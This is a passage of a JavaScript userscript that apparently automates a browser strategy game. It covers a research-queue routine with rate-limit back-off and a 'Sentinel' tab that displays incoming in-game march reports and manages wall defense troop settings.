		//		current_research[ job.research_type ]=true;
		//	}
		//}

		var city = Seed.cities[city_idx];
		
		var jobs = getJobs ( 'research', city_idx );
		
		// no research being done yet
		if ( jobs.length === 0 )
		{
			// Make the job list
			// Because a 0 level research is not in Seed.player.research (by Didi)
			// and also Spectral Outpost research
			var job_list = [];
			
			for ( var i=0; i < t.research_type.length; i++ )
			{
				var type  = t.research_type[i];
				
				if (typeof (t.research.current_research[ type ]) == 'undefined' || t.research.current_research[ type ] === false) {
					var level = ( Seed.player.research[ type ] ? parseInt( Seed.player.research[ type ] ) : 0 );
				
					if ( Data.options.research.level_enable[ type ] && Data.options.research.level_cap[ type ] > level ) {
						job_list.push( { type:type, level:level } );
					}
				}
			}
			
			// Sort the list by level
			job_list.sort ( function(a,b){return a.level - b.level} );
			
			for ( var i=0; i < job_list.length; i++ )
			{
				var job = job_list[i];
				// Check the requirements
				reqs = t.checkResearchReqs ( job.type, city_idx );

				// If the requirements are met, we began job
				if ( !reqs.msg )
				{
					// Initiates the request to the server
					MyAjax.researches ({
					
						city_id       : city.id,
						
						research_type : job_list[i].type,
						
						onSuccess     : function ( r ) {
							t.research.errors = 0;
							
							// Remove resources used
							Resources.remove( Seed.requirements.research[ r.job.research_type ].level[ r.job.level ].resources );

							var msg = '<b>' + translate('Researching') +': </b> '+ translate(r.job.research_type) + ' ('+ r.job.level +') ';
					
							actionLog(msg);
					
							t.research.inProgress = false;
							if (!Data.options.cheat.outpost_research) {
								if ( t.current_tab === 3 ) {
									t.dispFeedback ( msg + '... '+translate('next')+' '+translate('research')+' '+translate('in')+' '+ timeFormat( (r.job.duration + 15) ));
								}
							
								// Run the researchTick after the job finishes
								t.research.timer.tick = setTimeout ( t.researchTick, (r.job.duration + 15) * 1000 );
								return;
							} else {
								if ( t.current_tab === 3 ) {
									t.dispFeedback ( msg );
								}
							}
						},
						onFailure     : function ( r ) {
							
							clearTimeout ( t.research.timer.tick ); t.research.timer.tick=null;
							
							t.research.inProgress = false;

							if ( r.status ) {
								if ( r.status === 509 )	{
									var delay = ERROR_509_DELAY;
									if ( t.current_tab === 3 ) {
										t.dispFeedback ( '<b>' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') + ' :' + timeFormat( delay/1000 ) );
									}
									// Wait and try again
									t.research.timer.tick = setTimeout( t.researchTick, delay );
									return;
								}
								if ( r.status === 429 )	{
									var delay = ERROR_429_DELAY;
									if ( t.current_tab === 3 ) {
										t.dispFeedback ( '<b>API ' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') + ' :' + timeFormat( delay/1000 ) );
									}
									// Wait and try again
									t.research.timer.tick = setTimeout( t.researchTick, delay );
									return;
								}
							} 
							else {
							
								actionLog ('ERROR: '+ job.type + ' ' + r.errmsg);
								
								if ( ++t.research.errors > 10 )
								{
									if ( t.current_tab === 3 ) {
										t.dispFeedback (translate('Too many errors, disabling auto-research'));
									}
									t.setResearchEnable ( false );
									t.research.errors = 0;
									return;
								}
								
								if ( t.current_tab === 3 ) {
									t.dispFeedback ( translate( job.type ) + ': ' + r.errmsg);
								}
								
								// Run the researchTick after the job finishes
								t.research.timer.tick = setTimeout ( t.researchTick, t.research.error_delay );
								return;
							}
						},
						
						caller : 'Tabs.Jobs.researchTick'
						
					});

					break;
				}
				// The requirements were not met
				else {
					// If the user is on research tab shows the requirements
					if ( t.current_tab === 3 ) {
						t.dispFeedback ( translate(job.type) +' for '+city.name +':'+ reqs.msg);
					}
				}
			}
		}
		
		var next_city_idx = t.setNextResearchCity();
		
		delay = Math.randRange( 15000, 30000);

		if ( t.current_tab === 3 ) {
			t.dispFeedback ( translate( Seed.cities[ next_city_idx ].name ) + ' ' + translate('Starting Soon') + '...' + timeFormat(delay/1000) );
		}
		t.research.inProgress = false;		
		t.research.timer.tick = setTimeout ( t.researchTick, delay, next_city_idx );
	}
}

/***********************************   End Jobs  ***********************************/

//******************************** Attacks Tab *****************************
// References to camp and camps changed to mapObject to make sure that other data does not overwrite the camps
Tabs.Sentinel = {
	tab_order		: SENTINEL_TAB_ORDER,
	tab_label		: 'Sentinel',
	tab_disabled	: !SENTINEL_TAB_ENABLE,
	
	last_tab_id		: 'tabOptions',
	
	container		: null,
	
	report_num : null,
	table_output : [],
		
	timer			: {
		reports : null
	},
			
	init : function (div)
	{
		var t = Tabs.Sentinel;
		t.container = div;
		
		var html = 
		 '<div id=' + setUID('Tabs.Sentinel.title') + ' class=' + UID['title'] + '>' + translate('Sentinel') + ' </div>'
		+'<div class=' + UID['status_ticker'] + ' id='+ setUID('Tabs.Sentinel.status') + ' style="margin-bottom:5px !important">'
		+'	<center>'
		+'		<input type=button value="OnOff" id=' + setUID('Tabs.Sentinel.enabled') + ' />'
		+'	</center>'
		+'	<div id=' + setUID('Tabs.Sentinel.Reports') + ' class=' + UID['status_report'] + ' style="height:160px; max-height:160px;">'
		+'		<table id=' + setUID('Tabs.Sentinel.Reports.List') + ' class="' + UID['table'] + ' zebra"  style="width:474px;max-width:474px;">'
		+'		</table>'
		+'	</div>'
		+'	<div id=' + setUID('Tabs.Sentinel.Reports.Detail') + ' class=' + UID['status_report'] + ' style="height:140px; max-height:140px; display:none;" >'
		+'	</div>'
		+'</div>'
		+'<ul class=tabs>'
		+'	<li class="tab first"><a id=' + setUID('Tabs.Sentinel.tabWall')  + '>' + translate('Wall')     + '</a></li>'
		+'	<li class="tab first"><a id=' + setUID('Tabs.Sentinel.tabOptions') + '>' + translate('Options')    + '</a></li>'
		+'</ul>'
		+'<div id=' + setUID('Tabs.Sentinel.content') + ' style="padding-top:1px; height:500px;"></div>';
		
		$J( t.container ).html( html );
		

		// Add the event listeners
		$J('#'+UID['Tabs.Sentinel.enabled']).click (function (){
			t.setSentinelEnable ( !Data.options.sentinel.enabled );
		});
		
		$J( '#'+UID['Tabs.Sentinel.tabWall']  ).click ( {current_tab:0}, t.showSubTab );
		$J( '#'+UID['Tabs.Sentinel.tabOptions'] ).click ( {current_tab:1}, t.showSubTab );
		
		
		setTimeout (t.reportsTick, 1000);  
		
		t.showSubTab ( {data:{ current_tab: Data.options.sentinel.current_tab }} );
		
		window.addEventListener ( 'unload', t.onUnload, false );
		
		t.setSentinelEnable ( Data.options.sentinel.enabled );
				
	},

	show : function ()
	{
		var t = Tabs.Sentinel;

		t.showSubTab ( {data:{ current_tab: Data.options.sentinel.current_tab }} );
	},
	
	hide : function ()
	{
		var t = Tabs.Sentinel;
	},

	onUnload : function ()
	{
		var t = Tabs.Sentinel;
	},
	
	showSubTab : function(event)
	{
		var t = Tabs.Sentinel;
		
		var current_tab = event.data.current_tab;
		
		Data.options.sentinel.current_tab = current_tab;

		var tab_name;
		switch ( current_tab )
		{
		case 0: tab_name='tabWall'  ; break;
		case 1: tab_name='tabOptions' ; break;
		default : tab_name='tabOptions' ; Data.options.sentinel.current_tab = current_tab = 1; break;
		}
		
		$J('#'+UID[t.last_tab_id])
		.css('z-index', '0')
		.removeClass('selected');
		
		$J('#'+UID['Tabs.Sentinel.' + tab_name])
		.css('z-index', '1')
		.addClass('selected');
		
		t.last_tab_id = 'Tabs.Sentinel.' + tab_name;
		//logit('tab_name='+tab_name);
		
		t[tab_name] ();
	},
	
	setSentinelEnable : function ( on_off )
	{
		var t = Tabs.Sentinel;
		
		var but = $id(UID['Tabs.Sentinel.enabled']);
		Data.options.sentinel.enabled = on_off;
		
		if ( on_off ) {
			but.value = translate('Watching').toUpperCase();
			but.className = UID['btn_on'];
		} 
		else {
			but.value = translate('Disabled').toUpperCase();
			but.className = UID['btn_off'];
		}
		Sentinel.setEnable(on_off);
	},


	reportsTick : function ()
	{
		var t = Tabs.Sentinel;
		clearTimeout ( t.timer.reports ); t.timer.reports=null;
		t.updateList($id(UID['Tabs.Sentinel.Reports.List']));
		t.timer.reports = setTimeout ( t.reportsTick, 1000 );
	},

	updateList : function (table)
	{
		var t = Tabs.Sentinel;
		var now = serverTime();
		var report_list= Data.options.sentinel.messages;

		//report_list.sort( function(a,b){return a.arrives_at - b.arrives_at;} );

		for (var i = 0;i<report_list.length; i++) {
			
			var report = report_list[i];
			
			if (!report.id) continue;
			
			var bt_style;

			var time_left,color,sign,time_format
			if (report.arrives_at > now) {
				color='tfr';
				sign = '-';
				time_left=report.arrives_at - now;
			} else {
				color='tfb';
				sign = '+';
				time_left=now - report.arrives_at;
			}
			sign = '<span class='+color+'-h>' + sign + '</span>'
			time_format = sign + timeFormat( time_left, false , color);
			
			var arrives_at_time = new Date(report.arrives_at * 1000).toLocaleString().substring(0,33);
			
			var iRow, iCell;
			var rownum = t.table_output.indexOf(report.id);
			if (rownum == -1 ) {
				logit('report='+inspect(report,8,1));
				//logit('report time='+report.warnings.march_arrival_time.replace(/-/g,'/')); //.replace('UTC','')
				//logit('report time='+(new Date(report.warnings.march_arrival_time.replace(/-/g,'/')).getTime())); //.replace('UTC','')
				var newRow = insertNewRow(table,report.arrives_at);
				iRow=newRow.newRow;

				if (newRow.index == -1) {
					t.table_output.push(report.id);
				} else {
					t.table_output.splice(newRow.index,0,report.id);
				}
					
				iRow.setAttribute( 'sort', report.arrives_at );
				iRow.setAttribute( 'ref', report.id );
				
				//0 ... march type
				iCell = iRow.insertCell( -1 );
				iCell.innerHTML = ((report.warnings && report.warnings.march_type) ? ('<span class="' + UID['doa-icons'] + ' i-' + report.warnings.march_type + '"></span>') 
																																					 : ('<span class="' + UID['doa-icons'] + ' i-Unknown"></span>'))
												+	((report.warnings && report.warnings.march_type) ? (translate(report.warnings.march_type)) 
																																					 : (translate('Unknown')));
				//1 ... arrives time
				iCell = iRow.insertCell( -1 );
				iCell.innerHTML = arrives_at_time;

				//2 ... time left
				iCell = iRow.insertCell( -1 );
				iCell.innerHTML = time_format;

				//3 ... view button
				iCell = iRow.insertCell( -1 );

				var button = document.createElement('input');

				button.type = 'image';

				// Save the current report id in the attibute "ref" of the button
				button.setAttribute( 'ref', report.id );

				button.className = UID['doa-icons'] + ' i-Show ' + UID['bnt_image_green'];
				button.value = '';

				$J(button).click ( function( event ){
					var t = Tabs.Sentinel;
					var self = event.target;
					
					// Take the report id from the "ref" attribute
					var id = parseInt(self.getAttribute( 'ref' ));
					toggleBtClass(self,t.report_num);
					toggleReportDetail(t.report_num,id);
					HideShowRows(table,t.report_num);
				});

				iCell.appendChild( button );
				iCell.style.textAlign = 'right';

				//4 ... delete button
				iCell = iRow.insertCell( -1 );

				var button = document.createElement('input');

				button.type = 'image';

				// Save the current report id in the attibute "ref" of the button
				button.setAttribute( 'ref', report.id );

				button.className = 'ui-corner-all '+ UID['doa-icons'] + ' i-cancel';
				button.style.backgroundColor = "rgb(140,140,140)";
				button.value = '';

				$J(button).click ( function( event ){
					var t = Tabs.Sentinel;
					var self = event.target;
					
					self.disabled = true;
					self.style.display = 'none';
					// Take the report id from the "ref" attribute
					var id = parseInt(self.getAttribute( 'ref' ));

					var row_num = t.table_output.indexOf(id);

					if ( row_num == -1 ) return;
					deleteRow(table,row_num,id);
					if (t.report_num != null) {
						toggleReportDetail(t.report_num,id);
						t.report_num=null;
						HideShowRows(table,t.report_num);
					}
				});
				
				iCell.appendChild( button );
				iCell.style.textAlign = 'right';

				HideShowRows(table,t.report_num);
				
			} else {
				iRow = table.rows[rownum];
				
				if( iRow === undefined )
				{
					t.table_output.splice(rownum,1);
					continue;
				}
				iRow.cells[2].innerHTML = time_format;
			}
		}

		//Didi : check if reports exists
		var i = 0;
		while (i<t.table_output.length) {
			var report_id=t.table_output[i];
			if (!report_id) {
				i++;
				continue;
			}
			var msg = $J.grep(Data.options.sentinel.messages, function(e){ return (e.id && e.id == report_id) ; });
			if (msg.length == 0) {
				deleteRow(table,i,report_id);
			} else {
				i++;
			}
		}
		
		function insertNewRow(table,criterion) {
			var newRow;
			var row = 0;
			while (row < table.rows.length && !newRow )
			{  
				if ( table.rows[row].getAttribute('sort') < criterion )
				{
					newRow=table.insertRow(row);
				} else {
					row++
				}
			}
			if (!newRow) {
				newRow=table.insertRow(-1);
				row=-1;
			}
			return {newRow : newRow, index : row };
		}
		
		function deleteRow(table,num,report_id) {
			var t = Tabs.Sentinel;
			Data.options.sentinel.messages = $J.grep(Data.options.sentinel.messages, function(e){ return !e.id || (e.id && e.id !== report_id) ; });

			table.deleteRow(num);
			t.table_output.splice(num,1);
		}
		
		function HideShowRows(table,report_id) 
		{
			var iRow;
			for (var row = 0;row < table.rows.length;row ++) {
				var iRow=table.rows[row];
				if (report_id == null) {
					iRow.style.display = '';
				} else {
					if ( iRow.getAttribute('ref') == report_id ) {
						iRow.style.display = '';
					} else {
						iRow.style.display = 'none';
					}
				}
			}
		}
		
		function toggleBtClass(button,stat)
		{
			if (stat == null) {
				button.className = UID['doa-icons'] + ' i-Hide ' + UID['bnt_image_green'];
			} else {
				button.className = UID['doa-icons'] + ' i-Show ' + UID['bnt_image_green'];
			}
		}
		
		function toggleReportDetail(old_stat,new_stat)
		{
			var t = Tabs.Sentinel;
			if (old_stat == null) {
				t.report_num = old_stat = new_stat;
				$J( '#'+UID['Tabs.Sentinel.Reports'] )
				.css ( {
					'height'		: '20px',
					'overflow'      : 'hidden'
				});
				$J( '#'+UID['Tabs.Sentinel.Reports.Detail'] ).css ( 'display', '');
				t.showReport(t.report_num);
			} else {
				t.report_num = old_stat = null;
				$J( '#'+UID['Tabs.Sentinel.Reports'] )
				.css ( {
					'height'		: '160px',
					'overflow'      : 'auto'
				});
				$J( '#'+UID['Tabs.Sentinel.Reports.Detail'] ).css ( 'display', 'none');
			}
		}
		
	},

	showReport : function(id) {
		var t = Tabs.Sentinel;
		var report_list = $J.grep(Data.options.sentinel.messages, function(e){ return e.id && e.id == id ; });

		$J( '#'+UID['Tabs.Sentinel.Reports.Detail'] ).html ( '' );

		if (report_list.length == 0) return;
		var report = report_list[0].warnings;
		if (!report) return;

		var html=
			'<table class="' + UID['table'] + '" style="width:474px;max-width:474px;">';
		
		html +=
			'	<tr>'
		+ '		<th colspan=2 align=center>'+translate('Your Sentinel was level ')+report_list[0].sentinel_level+'</th>'
		+	'	</tr>';
		
		html +=
			'	<tr>'
		+	'		<td align=right><b>'+translate('March Type')+' : '+'</b></td>'
    if (report.march_type)
    {
			html +=
			 '	<td>'+translate(report.march_type)+'</td>';
    } else {
			html +=
			 '	<td>'+translate('Unknown')+' <b>('+translate('Update your sentinel to level 2')+')'+'</b></td>';
    }
		html +=
			'	</tr>'
		+	'	<tr>'
		+	'		<td align=right><b>'+translate('From')+' : '+'</b></td>';
		var attacker='';
    if (report.attacker_name)
    {
    	attacker += report.attacker_name
    } 
    if (report.attacker_title) {
    	if (attacker == '') {
    		attacker +=translate('A player');
    	}
    	attacker += ' ('+translate('LvL')+' '+report.attacker_title.level+')';
    	if (report.attacker_title.alliance) {
    		attacker += ' '+translate('of alliance')+' '+report.attacker_title.alliance;
    	}
    }
    if (report.attacker_coords) {
    	attacker +=' ('+report.attacker_coords.x+','+report.attacker_coords.y+')';
    }
    if (attacker == '') {
			attacker += translate('Unknown')+' <b>('+translate('Update your sentinel to level 4')+')</b>'
    }
		html +=
			'		<td>'+ attacker +'</td>';
		html +=
			'	</tr>'
		+	'	<tr>'
		+	'		<td align=right><b>'+translate('To')+' : '+'<b></td>';
    if (report.march_incoming)
    {
    	var city_id=report.march_incoming;
    	var city_idx = Seed.city_idx[ city_id ];
    	var city = Seed.cities[city_idx];
    	if (city) {
    		var target = 'Capital';
    		if (report.outpost_attack) {
    			target = 'Outpost';
    		} 
    		html +=
			 	'	<td>'+translate(target)+ ' ' + translate(city.name)+'</td>';
    	}
    }
		html +=
			'	</tr>';
		if (report.march_type && report.march_type == 'AttackMarch') {
			html +=
			 '<tr>'
			+'	<td align=right><b>'+translate('General')+' : '+'</b></td>';
			if (typeof report.general_rank != 'undefined') {
				html +=
			 	'	<td>'+((report.general_rank == 0) ? translate('Neophyte'): report.general_rank + ' ' + translate('Star')) + '</td>';
			} else {
				html +=
			 	'	<td>'+translate('Unknown')+' <b>('+translate('Update your sentinel to level 5')+')'+'</b></td>';
			}		
			html +=
			 '</tr>';
		}
		
		var detail_level;
		var troop_row = 1;
		html +=
		 '	<tr>'
		+'		<td align=right><b>'+translate('Troops')+' : '+'</b></td>';
    if (report.attacker_total_estimate)
    {
			html +=
			 '	<td>' + translate('Estimate to ') + parseInt(report.attacker_total_estimate).intToCommas() +'</td>'
 			+'</tr>';
			troop_row ++;
			detail_level = 7;
    }
    if (report.attacker_types)
    {
    	for(var i=0;i<report.attacker_types.length;i++)
    	{
	    	if (troop_row > 1) {
				html +=
			 '<tr>'
				+'<td></td>';
  	  	}
	  		html +=
	  		 '<td>'+translate(report.attacker_types[i])+'</td>'
	  	+'</tr>';
	  		troop_row++;  		
    	}
    	detail_level = 8;
    } else if (report.attacker_estimates)
    {
			html +=
			 '	<td>' + translate('Estimate to ') +'</td>'
 			+'</tr>';
			troop_row ++;
    	for(var type in report.attacker_estimates)
    	{
	    	if (troop_row > 1) {
				html +=
			 '<tr>'
				+'<td></td>';
  	  	}
	  		html +=
	  		 '<td>'+parseInt(report.attacker_estimates[type]).intToCommas()+' '+translate(type)+'</td>'
	  	+'</tr>';
	  		troop_row++;  		
    	}
    	detail_level = 9;
    } else if (report.attacker_units) 
    {
    	for(var type in report.attacker_units)
    	{
	    	if (troop_row > 1) {
				html +=
			 '<tr>'
				+'<td></td>';
  	  	}
	  		html +=
	  		 '<td>'+parseInt(report.attacker_units[type]).intToCommas()+' '+translate(type)+'</td>'
	  	+'</tr>';
	  		troop_row++;  		
    	}
    }
    if (troop_row == 1) {
  		html +=
				'	<td>'+translate('Unknown')+'</td>'
			+ '</tr>';
			detail_level = 6;    	
    }
    if (detail_level) {
			html +=
			 '<tr>'
			+'	<td></td>'
			+'	<td><b>'+'('+translate('Update your sentinel to level')+' '+detail_level+' '+translate('for more details')+')'+'</b></td>'
			+'</tr>';
    }
 		
		html +=
			'</table>';

		$J( '#'+UID['Tabs.Sentinel.Reports.Detail'] ).html ( html );
	},
	//*** Sentinel Tab - Wall Sub-Tab ***
	//----------------------------------------------------------------------------
	tabWall : function ()
	{
		var t = Tabs.Sentinel;
		//logit('tabwall');
		var html = 
		 '<div class=' +  UID['subtitle'] + ' width=100% style="background-color: rgba(30,30,30,0.7) !important;padding:1px !important;margin-bottom: 0 !important;">'
		+'	<table class=' + UID['table'] + ' width=100%>'
		+'		<tr>'
		+'			<td width=25% style="text-align:left;padding-left:5px;">'
		+				  '&nbsp;'
		+'			</td>'
		+'			<td width=50% style="text-align:center;">'
		+ 				translate('Wall Configuration') 
		+'			</td>'
		+'			<td width=25% style="text-align:right !important;padding-right:5px;">'
		+'				<input align=right class="'+UID[ (Seed.cities[0].defended ? 'btn_off' : 'btn_on') ]+ '" type=button value="'+translate(Seed.cities[0].defended?'Defend':'Hiding').toUpperCase()+'" id=' + setUID('Tabs.Sentinel.tabWall.changewall') + ' />'
		+'			</td>'
		+'		</tr>'
		+'	</table>'
		+'</div>'
		+'<table class=' + UID['table'] + ' width=100% style="padding: 0px !important;">'
		+'	<tr>'
		+'		<td width=50% style="border-right: 1px solid;padding: 0px 1px !important;">'
		+'			<table class="' + UID['table'] + '" width=100% >'
		+'				<th>'+translate('Actual Configuration')+'</th>'
		+'				<tr height=19pt>'
		+'					<td align=center>'
		+'						&nbsp;'
		+'					</td>'
		+'				</tr>'
		+'				<tr height=19pt>'
		+'					<td align=center>'
		+'						&nbsp;'
		+'					</td>'
		+'				</tr>'
		+'				<tr>'
		+'					<td align=center>'
		+'						<input type=button class='+UID['btn_on']+' value="' + translate('Save to the right -->') + '" id='+ setUID('Tabs.Sentinel.tabWall.SaveConf') +' />'
		+'					</td>'
		+'				</tr>'
		+'				<tr>'
		+'					<td align=left>'
		+'						<input type=button class='+UID['btn_on']+' value="' + translate('Remove ALL') + '" id='+ setUID('Tabs.Sentinel.tabWall.RemoveAll') +' style="width:auto !important;"/>'
		+'					</td>'
		+'				</tr>'
		+'				<tr>'
		+'					<td align=left>'
		+'						<div id='+setUID('Tabs.Sentinel.tabWall.ActConf')+'  style="height:380px !important;padding: 0px !important;overflow-y:hidden !important;">' + '</div>'
		+'					</td>'
		+'				</tr>'
		+'			</table>'
		+'		</td>'
		+'		<td width=50% style="padding: 0px 1px !important;">'
		+'			<table class="' + UID['table'] + '" width=100% >'
		+'				<th colspan=2 >'+translate('New Configuration')+'</th>'
		+'				<tr>'
		+'					<td align=right width=30px>'+ translate('Config') +' :&nbsp;</td>'
		+'					<td align=left>'
		+'						<div id='+setUID('Tabs.Sentinel.tabWall.Select')+'>' + '</div>'
		+'					</td>'
		+'				</tr>'
		+'				<tr>'
		+'					<td align=right width=30px>'+ translate('New name') +' :&nbsp;</td>'
		+'					<td align=left>'
		+'						<input style="text-align:left !important;" id=' + setUID('Tabs.Sentinel.tabWall.new_name') + ' size=20 maxlength=20 type=text value="">'
		+'						</input>'
		+'					</td>'
		+'				</tr>'
		+'				<tr>'
		+'					<td align=left width=30px>'
		+'						<input type=button class='+UID['btn_on']+' value="' + translate('Apply config') + '" id='+ setUID('Tabs.Sentinel.tabWall.ApplyConf') +' style="width:auto !important;"/>'
		+'					</td>'
		+'					<td align=right>'
		+'						<input type=button class='+UID['btn_on']+' value="' + translate('Apply config and Defend') + '" id='+ setUID('Tabs.Sentinel.tabWall.ApplyConfDef') +' style="width:auto !important;" />'
		+'					</td>'
		+'				<tr>'
		+'					<td align=left>'
		+'						<input type=button class='+UID['btn_on']+' value="' + translate('Clear ALL') + '" id='+ setUID('Tabs.Sentinel.tabWall.ClearAll') +' style="width:auto !important;"/>'
		+'					</td>'
		+'					<td align=right>'
		+'						<input type=button class='+UID['btn_on']+' value="' + translate('Max Troop') + '" id='+ setUID('Tabs.Sentinel.tabWall.MaxTroop') +' style="width:auto !important;"/>'
		+'					</td>'
		+'				</tr>'
		+'				</tr>'
		+'				<tr>'
		+'					<td align=left colspan=2>'
		+'						<div id='+setUID('Tabs.Sentinel.tabWall.NewConf')+' style="height:380px !important;overflow-y:auto !important;">' + '</div>'
		+'					</td>'
		+'				</tr>'
		+'			</table>'
		+'		</td>'
		+'	</tr>'
		+'</table>';

		$J('#'+UID['Tabs.Sentinel.content']).html( html );
		
		fill_select();
		fill_ActConf();
		fill_NewConf();
		

		$J('#'+UID['Tabs.Sentinel.tabWall.changewall'])
		.click ( changeWall );

		$J('#'+UID['Tabs.Sentinel.tabWall.NewConf']).on('scroll', function () {
    	$J('#'+UID['Tabs.Sentinel.tabWall.ActConf']).scrollTop($J(this).scrollTop());
		});

		$J('#'+UID['Tabs.Sentinel.tabWall.SaveConf']).click( function () {
			var city = Seed.cities[0];
			if (city.defense_force && Data.options.sentinel.wall.config_select !== null) {
				Data.options.sentinel.wall.config[Data.options.sentinel.wall.config_select].units=city.defense_force.cloneProps();
				fill_NewConf();
			}
		});

		$J('#'+UID['Tabs.Sentinel.tabWall.RemoveAll']).click( function () {
			var city = Seed.cities[0];
			MyAjax.defense_troop ({
				city_id       : city.id,
				units		      : {},
				
				onSuccess     : function ( r ) {
					fill_ActConf();
    		},
				
				onFailure     : function ( r ) {
    		},
				
				caller       : 'Tabs.Sentinel.tabWall.RemoveAll'
			});
		});

		$J('#'+UID['Tabs.Sentinel.tabWall.ApplyConf']).click( function () {
			if (Data.options.sentinel.wall.config_select !== null) {
				var city = Seed.cities[0];
				var units = Data.options.sentinel.wall.config[Data.options.sentinel.wall.config_select].units.cloneProps();
				for (var unit_type in units) {
					if (units[unit_type] === 'MAX') {
						var num_units = Units.getUnitNumbers( 0 , unit_type );
 						var nb_unit = num_units.incity + num_units.indefense;
						units[unit_type] = nb_unit;						
					}
					if (units[unit_type] === 0) {
						delete units[unit_type];
					}
				}
				MyAjax.defense_troop ({
					city_id       : city.id,
					units		      : units,
					
					onSuccess     : function ( r ) {
						fill_ActConf();
    			},
					
					onFailure     : function ( r ) {
    			},
					
					caller       : 'Tabs.Sentinel.tabWall.ApplyConf'
				});
			}
		});

		$J('#'+UID['Tabs.Sentinel.tabWall.ApplyConfDef']).click( function () {
			if (Data.options.sentinel.wall.config_select !== null) {
				var city = Seed.cities[0];
				var units = Data.options.sentinel.wall.config[Data.options.sentinel.wall.config_select].units.cloneProps();
				for (var unit_type in units) {
					if (units[unit_type] === 'MAX') {
						var num_units = Units.getUnitNumbers( 0 , unit_type );
 						var nb_unit = num_units.incity + num_units.indefense;
						units[unit_type] = nb_unit;						
					}
					if (units[unit_type] === 0) {
						delete units[unit_type];
					}
				}
				MyAjax.defense_troop ({
					city_id       : city.id,
					units		      : units,
					
					onSuccess     : function ( r ) {
						var button = $id(UID['Tabs.Sentinel.tabWall.changewall']);
						changeWall({target : button});
						fill_ActConf();
    			},
					
					onFailure     : function ( r ) {
    			},
					
					caller       : 'Tabs.Sentinel.tabWall.ApplyConfDef'
				});
			}
		});

		$J('#'+UID['Tabs.Sentinel.tabWall.ClearAll']).click( function () {
			if (Data.options.sentinel.wall.config_select !== null) {
				Data.options.sentinel.wall.config[Data.options.sentinel.wall.config_select].units={};
				fill_NewConf();
			}
		});

		$J('#'+UID['Tabs.Sentinel.tabWall.MaxTroop']).click( function () {
			if (Data.options.sentinel.wall.config_select !== null) {
				var units={};
				for ( var i=0; i < Units.all_units_type.length; i++ )
				{
					var unit_type = Units.all_units_type[i];
					
					//var num_units = Units.getUnitNumbers( 0 , unit_type );
      	
					//var nb_unit = num_units.incity + num_units.indefense;
					
					units[unit_type] = 'MAX';
					//if (nb_unit === 0) {
					//	delete units[unit_type];
					//}
				}
				Data.options.sentinel.wall.config[Data.options.sentinel.wall.config_select].units=units.cloneProps();
				fill_NewConf();
			}
		});

		$J('#'+UID['Tabs.Sentinel.tabWall.new_name']).change( function (event) {
			if (Data.options.sentinel.wall.config_select !== null) {
				Data.options.sentinel.wall.config[Data.options.sentinel.wall.config_select].name = event.target.value; 
				event.target.value='';
				fill_select();
			}
		});

		function fill_select () {
			var html,selected;
			
			html = 
		 	  '			<select id=' + setUID('Tabs.Sentinel.tabWall.Config') + '>';
			for (var i=0;i<Data.options.sentinel.wall.config.length;i++)
			{
				selected = '';
				if (Data.options.sentinel.wall.config_select !== null && Data.options.sentinel.wall.config_select === i ) {
					selected = 'selected';
				}
				html +=
		 			'			<option value="' + i + '" ' + selected + '>' +Data.options.sentinel.wall.config[i].name + '</option>';
			}
			html +=
			+ '			</select>';
			
			$J('#'+UID['Tabs.Sentinel.tabWall.Select']).html( html );

			$J('#'+UID['Tabs.Sentinel.tabWall.Config']).change( function (event) {
				Data.options.sentinel.wall.config_select = parseInt(event.target[event.target.selectedIndex].value);
				//logit('event.target.selectedIndex='+event.target.selectedIndex);
				//logit('event.target[event.target.selectedIndex].value='+event.target[event.target.selectedIndex].value);
				fill_NewConf();
			});

		}

		function fill_ActConf () {
			var html;
			
			html = 
				 '		<table class="' + UID['table'] + ' zebra" width=100%>';
				 
			for ( var i=0; i < Units.all_units_type.length; i++ )
			{
				var num_units = Units.getUnitNumbers( 0 , Units.all_units_type[i] );
				
				html +=
				 '			<tr height=20px>'
				+'				<td align=left>' 
				+'					<span class="' + UID['doa-icons'] + ' i-' +  Units.all_units_type[i] + '" ></span>'
				+						translate( Units.all_units_type[i])
				+'				</td>'
				+'				<td align=right>' + '<b>' + num_units.indefense + '</b>' + '</td>'
				+'			</tr>';
			}       
			
			html += 
				 '		</table>';
				 
			$J('#'+UID['Tabs.Sentinel.tabWall.ActConf']).html( html );
		}

		function fill_NewConf () {
			var html;
			
			html = 
				 '		<table class="' + UID['table'] + ' zebra" width=100%>';
				 
			for ( var i=0; i < Units.all_units_type.length; i++ )
			{
				var num_units = Units.getUnitNumbers( 0 , Units.all_units_type[i] );
				if (Data.options.sentinel.wall.config_select !== null ) {
					var units = Data.options.sentinel.wall.config[Data.options.sentinel.wall.config_select].units;
					var conf_units = units[Units.all_units_type[i]] || 0;
				} else { 
					var conf_units = '';
				}
				
				html +=
				 '			<tr height=20px>'
				+'				<td align=right>' 
				+'					<span class="' + UID['doa-icons'] + ' i-' +  Units.all_units_type[i] + '" ></span>'
				+'					<input id=' + setUID('Tabs.Sentinel.tabWall.Units_'+i) + ' ref="'+Units.all_units_type[i]+'" size=15 maxlength=15 type=text value="'+conf_units+'">'
				+'					</input>'
				+'				</td>'
				+'				<td align=left>' + '&nbsp;(' + (num_units.incity + num_units.indefense) + ')' + '</td>'
				+'			</tr>';
				
				
			}       
			
			html += 
				 '		</table>';
				 
			$J('#'+UID['Tabs.Sentinel.tabWall.NewConf']).html( html );

			for ( var i=0; i < Units.all_units_type.length; i++ )
			{
				$J('#'+UID['Tabs.Sentinel.tabWall.Units_'+i]).change( function (event) {
					var self = event.target;
					var unit_type = self.getAttribute( 'ref' );

					if (self.value === 'MAX') {
						if (Data.options.sentinel.wall.config_select !== null ) {
							Data.options.sentinel.wall.config[Data.options.sentinel.wall.config_select].units[unit_type] = 'MAX';
						}
					} else {
						var num_units = Units.getUnitNumbers( 0 ,unit_type );

						if (isNaN(self.value)) {
							var nb_unit = 0;
						} else {
							var nb_unit =  parseIntZero( self.value );
						}
						self.value = nb_unit;
					
						if (nb_unit > (num_units.incity + num_units.indefense) ) {
							nb_unit = num_units.incity + num_units.indefense;
							self.value = nb_unit;
						}
						if (Data.options.sentinel.wall.config_select !== null ) {
							Data.options.sentinel.wall.config[Data.options.sentinel.wall.config_select].units[unit_type] = nb_unit;
							if (nb_unit === 0) {
								delete Data.options.sentinel.wall.config[Data.options.sentinel.wall.config_select].units[unit_type];
							}
						}
					}
				});
			}
		}

		function changeWall (event)
		{
			var button = event.target;
			button.disabled = true;
			new MyAjax.defendedCity({
